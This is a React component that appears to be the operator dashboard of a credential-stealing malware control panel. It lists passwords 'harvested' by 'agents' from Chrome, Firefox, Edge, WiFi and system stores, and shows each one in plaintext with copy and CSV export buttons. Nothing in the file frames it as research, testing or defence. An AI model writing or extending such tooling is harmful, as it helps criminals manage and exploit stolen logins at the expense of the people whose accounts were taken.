import React, { useState, useEffect } from 'react';
import { api } from '../api';

export default function Credentials() {
  const [creds, setCreds] = useState([]);
  const [filter, setFilter] = useState('all');
  const [search, setSearch] = useState('');

  useEffect(() => {
    let params = '';
    if (filter !== 'all') params += 'source=' + filter;
    if (search) params += (params ? '&' : '') + 'search=' + encodeURIComponent(search);
    api.getCredentials(params).then(setCreds).catch(() => {});
  }, [filter, search]);

  const exportCSV = async () => {
    const blob = await api.exportCredentials();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'credentials.csv';
    a.click();
    URL.revokeObjectURL(url);
  };

  const copyPw = (pw) => {
    navigator.clipboard.writeText(pw).catch(() => {});
  };

  return (
    <div>
      <div className="page-title">// CREDENTIALS — GLOBAL</div>
      <div className="filter-bar">
        {['all','chrome','firefox','edge','wifi','system'].map(f => (
          <button key={f} className={`btn ${filter === f ? 'active' : ''}`} onClick={() => setFilter(f)}>{f.toUpperCase()}</button>
        ))}
        <input type="text" className="search-input" placeholder="Search credentials..." value={search} onChange={e => setSearch(e.target.value)} />
        <button className="btn btn-green" style={{ marginLeft: 'auto' }} onClick={exportCSV}>EXPORT CSV</button>
      </div>
      <div className="panel">
        <table>
          <thead><tr><th>Agent</th><th>Source</th><th>URL</th><th>Username</th><th>Password</th><th>Harvested</th><th></th></tr></thead>
          <tbody>
            {creds.length === 0 ? (
              <tr><td colSpan={7} style={{ textAlign: 'center', color: 'var(--text-disabled)', padding: 24 }}>No credentials harvested yet</td></tr>
            ) : creds.map(c => (
              <tr key={c.id}>
                <td style={{ color: 'var(--green)' }}>{c.agent_id?.substring(0, 10)}</td>
                <td>{c.source}</td>
                <td style={{ color: 'var(--text-sec)' }}>{c.url}</td>
                <td>{c.username}</td>
                <td><span className="pw-plain">{c.password}</span></td>
                <td>{c.created_at ? new Date(c.created_at).toLocaleTimeString() : '-'}</td>
                <td><button className="copy-btn" onClick={() => copyPw(c.password)}>COPY</button></td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
